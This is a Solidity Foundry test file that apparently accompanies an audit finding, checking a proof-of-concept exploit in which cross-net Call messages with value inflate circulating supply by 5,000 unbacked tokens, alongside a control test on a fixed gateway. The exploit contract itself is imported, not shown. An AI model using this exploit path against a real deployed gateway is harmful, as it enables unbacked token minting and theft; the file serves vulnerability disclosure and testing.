// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Erc20,
    CheckpointingFacetFixed,
    IpcEnvelope,
    IpcMsgKind
} from "./65089-h-02-xnet-call-messages-with-value-0-lead-to-inflated-circul.sol";

contract PoC_65089_CallValueSkipsCircSupply is Test {
    uint256 internal constant SUPPLY = 1_000_000 ether;
    uint256 internal constant VALUE = 5_000 ether;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_call_value_leaves_5000_unbacked() public {
        Exploit exp = new Exploit();
        exp.run();

        uint256 circ = exp.gateway().circSupplyA() + exp.gateway().circSupplyB();
        uint256 backing = exp.ipc().balanceOf(address(exp.gateway())) + exp.ipc().balanceOf(address(exp));
        assertEq(exp.gateway().circSupplyA(), SUPPLY, "source supply not reduced");
        assertEq(exp.gateway().circSupplyB(), VALUE, "destination increased");
        assertEq(circ - backing, VALUE, "5000 unbacked");
        assertEq(exp.marker().balanceOf(SINK), VALUE, "marker");
        assertEq(exp.gateway().totalValueAccounted(), 0, "call value skipped");
    }

    function test_control_call_value_debits_source_supply() public {
        Erc20 ipc = new Erc20("IPC");
        CheckpointingFacetFixed gateway = new CheckpointingFacetFixed(ipc, SUPPLY);
        ipc.mint(address(gateway), SUPPLY);
        IpcEnvelope[] memory msgs = new IpcEnvelope[](1);
        msgs[0] = IpcEnvelope({kind: IpcMsgKind.Call, recipient: address(this), value: VALUE});

        gateway.execBottomUpMsgs(msgs);

        uint256 circ = gateway.circSupplyA() + gateway.circSupplyB();
        uint256 backing = ipc.balanceOf(address(gateway)) + ipc.balanceOf(address(this));
        assertEq(gateway.circSupplyA(), SUPPLY - VALUE, "source debited");
        assertEq(ipc.balanceOf(address(this)), VALUE, "destination paid");
        assertEq(circ, backing, "no unbacked supply");
        assertEq(circ - backing, 0, "shortage is zero");
    }
}
